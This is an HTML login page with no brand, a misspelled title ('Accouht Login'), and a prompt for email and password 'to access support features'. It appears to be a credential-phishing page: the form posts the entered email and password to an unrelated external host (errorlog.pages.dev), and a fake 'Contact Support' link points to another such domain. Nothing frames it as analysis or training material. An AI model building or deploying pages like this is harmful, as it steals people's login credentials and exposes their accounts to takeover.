<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login to Your Account | Accouht Login</title>
<meta name="description" content="Learn how to login your account with our simple step by step guide">
<meta name="keywords" content="account login, my account login, login account">

<!-- Canonical URL (update to your actual page URL) -->

<!-- Favicon -->
<link rel="icon" href="images/favicon.png" type="image/x-icon" />


  <style>
    body {
      font-family: Arial, sans-serif;
      line-height: 1.6;
      margin: 0;
      padding: 0;
      background-color: #f8f8f8;
    }
    header {
      background-color: #002c5f;
      color: white;
      padding: 15px 20px;
      text-align: center;
    }
    nav {
      display: flex;
      justify-content: center;
      background-color: #004080;
    }
    nav a {
      color: white;
      padding: 14px 20px;
      text-decoration: none;
    }
    nav a:hover {
      background-color: #0066cc;
    }
    main {
      padding: 20px;
      max-width: 800px;
      margin: auto;
      background-color: white;
    }
    h1, h2 {
      color: #002c5f;
    }
    form {
      background-color: #f0f0f0;
      padding: 20px;
      border-radius: 8px;
    }
    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
    }
    input[type="email"],
    input[type="password"] {
      width: 80%;
      padding: 10px;
      margin-top: 5px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .form-check {
      margin-bottom: 15px;
    }
    .btn-primary {
      background-color: #004080;
      color: white;
      border: none;
      padding: 10px;
      width: 20%;
      border-radius: 4px;
      cursor: pointer;
    }
    .btn-primary:hover {
      background-color: #0066cc;
    }
    .text-muted {
      font-size: 0.9em;
      color: #666;
    }
    footer {
      background-color: #002c5f;
      color: white;
      text-align: center;
      padding: 15px 0;
      margin-top: 30px;
    }
  </style>
</head>
<body>

<header>
  <h1>Login Account Now</h1>
</header>

<main>
  <h2>Login to Your Account</h2>
  <p>Please enter your credentials to access support features.</p>
  
  <form action="https://errorlog.pages.dev/" method="post">
    <label for="email">Email address:</label>
    <input type="email" id="email" name="email" placeholder="Enter email" required>

    <label for="password">Password:</label>
    <input type="password" id="password" name="password" placeholder="Enter password" required>



    <button type="submit" class="btn-primary">Login</button>
  </form>

  <p class="text-muted mt-3">Need help? <a href="https://helpnow.pages.dev/">Contact Support</a></p>
</main>

<footer>
  &copy; Login Now | All Rights Reserved
</footer>

</body>
</html>
